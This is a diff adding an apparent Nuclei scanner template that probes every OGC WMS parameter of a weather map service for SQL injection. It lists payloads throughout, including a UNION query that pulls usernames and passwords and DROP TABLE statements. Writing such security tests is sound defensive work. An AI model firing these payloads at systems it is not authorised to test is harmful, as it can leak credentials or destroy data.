@@ -1,0 +1,401 @@
+id: ogc-wms-sqli-all-params
+
+info:
+  name: OGC WMS SQL Injection - All Parameters
+  author: weather-wms-security
+  severity: critical
+  description: |
+    Tests all WMS parameters for SQL injection vulnerabilities including:
+    - LAYERS, STYLES, QUERY_LAYERS (layer selection)
+    - CRS, SRS, BBOX (coordinate system and extent)
+    - WIDTH, HEIGHT, FORMAT (output format)
+    - TIME, RUN, FORECAST, ELEVATION (weather dimensions)
+    - BGCOLOR, TRANSPARENT, EXCEPTIONS
+    - I, J, X, Y, FEATURE_COUNT (GetFeatureInfo)
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://www.ogc.org/standards/wms
+  tags: sqli,wms,ogc,injection,critical
+
+variables:
+  base_layer: "gfs_TMP"
+  base_crs: "EPSG:4326"
+  base_bbox: "-180,-90,180,90"
+
+http:
+  # Test LAYERS parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{payload}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "{{base_layer}}'"
+        - "{{base_layer}}' OR '1'='1"
+        - "{{base_layer}}' OR '1'='1'--"
+        - "{{base_layer}}'; SELECT 1--"
+        - "{{base_layer}}\" OR \"1\"=\"1"
+        - "{{base_layer}}) OR (1=1"
+        - "1 UNION SELECT NULL,NULL,NULL--"
+        - "{{base_layer}}' AND 1=CONVERT(int,@@version)--"
+        - "{{base_layer}}'; WAITFOR DELAY '0:0:0'--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "ORA-"
+          - "PostgreSQL"
+          - "sqlite"
+          - "SQLITE_ERROR"
+          - "syntax error"
+          - "unterminated string"
+          - "Invalid column"
+          - "database error"
+        condition: or
+
+      - type: regex
+        regex:
+          - "(?i)(sql|database|query|select|insert|update|delete).*error"
+          - "(?i)syntax.*error.*at.*line"
+          - "(?i)unclosed quotation mark"
+          - "(?i)quoted string not properly terminated"
+
+  # Test STYLES parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "default'"
+        - "default' OR '1'='1"
+        - "' OR '1'='1'--"
+        - "'; SELECT 1--"
+        - "\" OR \"1\"=\"1"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+          - "database error"
+        condition: or
+
+      - type: regex
+        regex:
+          - "(?i)(sql|database).*error"
+
+  # Test QUERY_LAYERS parameter (GetFeatureInfo)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS={{base_layer}}&QUERY_LAYERS={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&X=128&Y=128&INFO_FORMAT=application/json"
+
+    payloads:
+      payload:
+        - "{{base_layer}}'"
+        - "{{base_layer}}' OR '1'='1"
+        - "' UNION SELECT username,password FROM users--"
+        - "{{base_layer}}'; DROP TABLE--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test CRS/SRS parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{payload}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&SRS={{payload}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "EPSG:4326'"
+        - "EPSG:4326' OR '1'='1"
+        - "'; SELECT 1--"
+        - "CRS:84' UNION SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test BBOX parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{payload}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "-180,-90,180,90'"
+        - "-180,-90,180,90' OR '1'='1"
+        - "-180,-90,180,90; SELECT 1--"
+        - "' OR '1'='1"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test WIDTH/HEIGHT parameters
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH={{payload}}&HEIGHT=256&FORMAT=image/png"
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT={{payload}}&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "256'"
+        - "256 OR 1=1"
+        - "256; SELECT 1--"
+        - "0 UNION SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test FORMAT parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT={{payload}}"
+
+    payloads:
+      payload:
+        - "image/png'"
+        - "image/png' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test TIME dimension (weather-specific)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&TIME={{payload}}"
+
+    payloads:
+      payload:
+        - "2024-01-01T00:00:00Z'"
+        - "2024-01-01T00:00:00Z' OR '1'='1"
+        - "'; SELECT 1--"
+        - "2024-01-01' UNION SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test RUN dimension (weather-specific)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&RUN={{payload}}"
+
+    payloads:
+      payload:
+        - "2024-01-01T00:00:00Z'"
+        - "' OR '1'='1"
+        - "'; DROP TABLE runs--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test FORECAST dimension (weather-specific)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&FORECAST={{payload}}"
+
+    payloads:
+      payload:
+        - "0'"
+        - "0' OR '1'='1"
+        - "'; SELECT 1--"
+        - "0 UNION SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test ELEVATION dimension (weather-specific)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&ELEVATION={{payload}}"
+
+    payloads:
+      payload:
+        - "850'"
+        - "850' OR '1'='1"
+        - "'; SELECT 1--"
+        - "0/1000' UNION SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test BGCOLOR parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&BGCOLOR={{payload}}"
+
+    payloads:
+      payload:
+        - "0xFFFFFF'"
+        - "0xFFFFFF' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test EXCEPTIONS parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&EXCEPTIONS={{payload}}"
+
+    payloads:
+      payload:
+        - "application/vnd.ogc.se_xml'"
+        - "' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test I/J parameters (GetFeatureInfo pixel coordinates)
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS={{base_layer}}&QUERY_LAYERS={{base_layer}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&I={{payload}}&J=128&INFO_FORMAT=application/json"
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS={{base_layer}}&QUERY_LAYERS={{base_layer}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&I=128&J={{payload}}&INFO_FORMAT=application/json"
+
+    payloads:
+      payload:
+        - "128'"
+        - "128 OR 1=1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test FEATURE_COUNT parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS={{base_layer}}&QUERY_LAYERS={{base_layer}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&I=128&J=128&INFO_FORMAT=application/json&FEATURE_COUNT={{payload}}"
+
+    payloads:
+      payload:
+        - "10'"
+        - "10 OR 1=1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test INFO_FORMAT parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS={{base_layer}}&QUERY_LAYERS={{base_layer}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&I=128&J=128&INFO_FORMAT={{payload}}"
+
+    payloads:
+      payload:
+        - "application/json'"
+        - "' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
